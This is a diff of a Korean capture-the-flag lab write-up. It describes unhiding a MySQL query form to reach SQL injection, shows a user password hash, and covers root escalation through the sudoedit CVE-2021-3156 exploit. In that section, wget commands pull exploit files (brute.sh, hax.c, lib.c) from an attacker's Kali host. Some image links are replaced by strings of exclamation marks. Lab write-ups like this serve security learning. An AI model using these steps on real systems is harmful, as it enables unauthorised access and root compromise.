@@ -54,14 +54,14 @@ M1,M2,M3,M4 값이 중요하기 때문에 복붙
 
 http://192.168.56.143/add.php에서 View Source Code를 들어가서 보면 쿼리 작성폼이라는 주석이있는 줄에 쿼리 작성 폼과 ID 조회하는 코드에 type=”hidden”이 되어 있는 것을 알 수 있다.
 
-![Image](https://github.com/user-attachments/assets/f803dce9-6c07-4622-af87-3e6f724ddc71)
+!!!!!!!!!!!!!!!!!!!!!
 
 
 개발자 도구 -F12
 <!- -MySQL 쿼리 입력 폼 -- > 주석 확인
 type=”hidden” 2개 확인 가능
 
-![Image](https://github.com/user-attachments/assets/f803dce9-6c07-4622-af87-3e6f724ddc71)
+!!!!!!!!!!!!!!!!!!!!!!!!!
 
 type=”hidden” 삭제
 
@@ -69,11 +69,11 @@ type=”hidden” -> type=”submit” 변경
 
 
 Mysql 쿼리 입력 부분 출력됨
-![Image](https://github.com/user-attachments/assets/1b296738-33a9-4060-8999-516679205e25)
+!!!!!!!!!!!!!!!!!!
 
 SQL Injection 공격 가능 – userID DB 확인 가능
 
-![Image](https://github.com/user-attachments/assets/db3dbe72-6868-4199-bba0-162e2cc87ff9)
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 
 
 ## XOR 연산
@@ -119,18 +119,19 @@ cr0sss1tescr1pt9
 password :
 df93ef64167b2334664ff59a5b8185f5
 
-
+![Image](https://github.com/user-attachments/assets/93817ac5-e880-4dd2-bf48-1dcaf8cbc4ac)
 
 
 ## User Flag
 
-
+![Image](https://github.com/user-attachments/assets/67b27143-5b03-4bef-ae07-28b84f7f9b08)
 
 
 ## Root Flag
 
 root로 권한 상승 - sudoedit
 
+![Image](https://github.com/user-attachments/assets/860113b8-fe28-4892-b37d-67c51934209d)
 
 https://github.com/blasty/CVE-2021-3156  참조
 
@@ -139,18 +140,24 @@ https://github.com/blasty/CVE-2021-3156  참조
 cr0sss1tescr1pt9 사용자는 vi,vim,nano 사용할 수 없다.
 
 kali-root 계정에서 /var/www/html/ 디렉터리에 파일 생성 후, cr0sss1tescr1pt9 사용자 계정에서 wget으로 파일을 다운로드한다.
+
+![Image](https://github.com/user-attachments/assets/55b9071e-acd5-4125-a93a-0b9bf4691f41)
 ```
 wget http://[kali ip]/brute.sh
 ```
+![Image](https://github.com/user-attachments/assets/efbcb372-cd7d-44e4-a68f-a7b37b068949)
 ```
 wget http://[kali ip]/hax.c
 ```
+![Image](https://github.com/user-attachments/assets/a66c7d11-fd0d-44d6-928b-d18b5c20d8f6)
 ```
 wget http://[kali ip]/lib.c
 ```
+![Image](https://github.com/user-attachments/assets/1e57f253-9b9a-4791-a059-c80f5fb96e8a)
 
 https://github.com/blasty/CVE-2021-3156 - Makefile 참고
-!!!!!!!!!!!!!!!
+
+![Image](https://github.com/user-attachments/assets/10a28bff-12d4-4aed-808a-d153e2604233)
 
 
 
